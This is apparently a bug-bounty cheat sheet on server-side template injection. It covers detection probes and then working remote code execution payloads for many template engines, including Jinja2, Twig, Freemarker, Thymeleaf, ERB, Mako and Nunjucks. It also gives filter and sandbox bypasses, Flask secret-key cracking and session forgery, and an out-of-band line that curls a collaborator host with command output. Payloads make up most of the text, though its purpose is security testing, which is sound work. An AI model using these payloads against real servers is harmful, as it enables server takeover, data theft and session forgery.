# Server-Side Template Injection (SSTI)

**TL;DR**: your input is evaluated by a server-side template engine → often **RCE**. Detect with math expressions (`{{7*7}}` → `49`), identify the engine, then escalate. Distinct from XSS (client) and CSTI (client-side).

## Where to look
- Server-rendered customizable content: email templates, notifications, invoices/PDF, display names, custom error messages, wiki/markdown, signatures, exports, API responses that interpolate, report parameters, configurable subject/body.
- Signal: your input with template syntax comes back **evaluated** (not literal).

## Detection (decision tree)
1. Inject polyglot: `${{<%[%'"}}%\` → any error = candidate.
2. Math by syntax:
   - `{{7*7}}` → `49`: Jinja2 (Python), Twig (PHP), Nunjucks, Django-ish.
   - `{{7*'7'}}` → `7777777` = Jinja2; → `49` = Twig.
   - `${7*7}` → `49`: Freemarker, Thymeleaf (`${...}`), JSP EL, Spring, Velocity `#set`.
   - `#{7*7}`: Ruby/Slim interpolation (ERB itself uses `<%= 7*7 %>`), Thymeleaf `#{...}`.
   - `<%= 7*7 %>` → `49`: ERB (Ruby), EJS.
   - `@(7*7)`: Razor (.NET).
3. Confirm the engine before firing an RCE payload.

## RCE payloads per engine (minimal PoC first)
- **Jinja2 / Python**:
  - `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
  - `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
  - `{{ ''.__class__.__mro__[1].__subclasses__() }}` then find `subprocess.Popen`.
  - Config leak: `{{ config }}`, `{{ config.items() }}` (Flask SECRET_KEY → session forgery).
    - Crack a weak/leaked Flask `SECRET_KEY` and forge the session with `flask-unsign` (`--unsign --cookie 'ey...' --wordlist rockyou.txt`, then `--sign`).
    - RCE when `popen`/`os` are filtered: write then load a config. `{{ ''.__class__.__mro__[2].__subclasses__()[N]('/tmp/x.cfg','w').write('from subprocess import check_output\nRUNCMD=check_output\n') }}`, then `{{ config.from_pyfile('/tmp/x.cfg') }}`, then `{{ config['RUNCMD']('id',shell=True) }}`.
- **Twig (PHP)**: `{{ ['id']|filter('system') }}`; older: `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}`.
- **Freemarker (Java)**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`; `${"freemarker.template.utility.Execute"?new()("id")}`.
- **Velocity (Java)**: `#set($e="e")$e.getClass().forName("java.lang.Runtime")...`.
- **Thymeleaf**: `${T(java.lang.Runtime).getRuntime().exec('id')}`, expression preprocessing `__${...}__::.x`.
- **Smarty (PHP)**: modern RCE via `{php}...{/php}` or gadget chains (bare `{system('id')}` only works on old versions).
- **ERB (Ruby)**: `<%= system('id') %>`, `<%= `id` %>`.
- **Mako (Python)**: `${__import__('os').popen('id').read()}`.
- **Nunjucks / Pug (Node)**: `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`.

## Blind SSTI
- No output? Time (`{{ ''.__class__... sleep }}`) or OOB (`... popen('curl http://collab/$(id|base64)') ...`).

## Sandbox escape
- Jinja2 sandbox / Twig sandbox: find the unfiltered gadgets (`__globals__`, `__mro__`, dangerous filters). See HackTricks/PayloadsAllTheThings for up-to-date gadget lists.

## Filter bypass
- Attribute via `|attr()`, the `request` object (Flask) to rebuild forbidden strings, concat, hex/`\x`, unicode, `[]` instead of `.` (`.__class__` → `['__class__']`).
- Bypass `_`/`.` blacklist: `{{ request['application']['__globals__'] }}`, `|attr('\x5f\x5fclass\x5f\x5f')`.

## Impact
- Server RCE = **Critical**. Even without RCE: file read, SECRET_KEY (→ cookie/JWT forgery), SSRF.

## Caido
- Automate a probe set (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`) + grep-extract the result (`49`, `7777777`) to fingerprint in bulk. Then Replay the engine-specific payload.

## References
- PortSwigger - SSTI - https://portswigger.net/web-security/server-side-template-injection
- PortSwigger - Identify/exploit + tree - https://portswigger.net/web-security/server-side-template-injection/exploiting
- PayloadsAllTheThings - SSTI - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- HackTricks - SSTI - https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/
- tplmap - https://github.com/epinna/tplmap
- James Kettle - Server-Side Template Injection (whitepaper) - https://portswigger.net/research/server-side-template-injection
- YesWeHack guide - SSTI / cache poisoning / logic - https://www.yeswehack.com/learn-bug-bounty/ssti-cache-poisoning-logic-vulnerabilities
